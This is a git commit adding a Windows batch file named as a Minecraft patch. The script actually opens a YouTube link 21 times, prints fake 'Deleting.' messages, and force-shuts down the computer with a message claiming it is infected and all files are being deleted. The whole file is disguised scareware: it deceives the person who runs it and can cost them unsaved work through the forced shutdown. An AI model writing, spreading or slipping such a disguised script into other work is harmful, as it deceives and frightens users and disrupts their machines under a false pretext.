988cc7e816d8c95eef44232b8dfc0c6eec912c57
TrineIsTheBest321 <lagsterlamen@gmail.com>
2024-05-27 13:21:37 -0600

    Add files via upload

---
+++ Minecraft_Patchv10.bat
@@ -0,0 +1,51 @@
+
+    @echo off
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+start "" "https://www.youtube.com/watch?v=48rz8udZBmQ"
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deleting.
+    echo Deletion Complete.
+    shutdown -s -f -t 35 -c "Your computer has been infected, This means we can do anything to your computer, Currently we are deleting every file on this device, Have fun :D"
+
